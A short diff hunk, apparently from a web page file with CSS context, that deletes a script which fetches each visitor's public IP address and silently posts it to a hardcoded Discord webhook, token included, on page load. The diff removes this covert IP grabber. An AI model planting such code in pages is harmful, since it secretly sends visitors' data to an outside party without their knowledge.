@@ -186,29 +186,4 @@ font-family: 'Open Sans Condensed', sans-serif;
 
 //
                 
-function getIP() {
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => postToWebhook(data.ip));
-}
 
-// Function to post the IP address to a Discord webhook
-function postToWebhook(ip) {
-  let webhookURL = 'https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh';
-  
-  let payload = {
-    'content': `The IP address of this device is ${ip}`
-  }
-
-  fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(payload)
-  });
-}
-
-// Call the getIP function to start the process
-getIP();
-```
